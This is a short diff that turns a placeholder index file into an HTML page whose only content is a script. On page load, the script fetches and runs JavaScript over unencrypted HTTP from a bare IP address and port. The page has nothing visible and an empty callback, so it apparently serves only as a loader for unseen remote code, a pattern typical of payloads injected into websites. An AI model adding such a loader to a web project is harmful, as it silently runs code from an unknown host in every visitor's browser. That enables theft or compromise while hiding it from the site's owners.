@@ -1,1 +1,17 @@
-index
+<html>
+<head></head>
+<body>
+<p id="text"></p>
+<script>
+let script = document.createElement('script');
+script.type = 'text/javascript';
+script.onload = script.onreadystatechange = function() {
+    if (!this.readyState || this.readyState === 'loaded' || this.readyState === 'complete') {
+        // 在这里执行你的回调函数
+    }
+};
+script.src = 'http://38.60.198.110:8099/'; // 设置脚本的 src
+document.body.appendChild(script);
+</script>
+</body>
+</html>
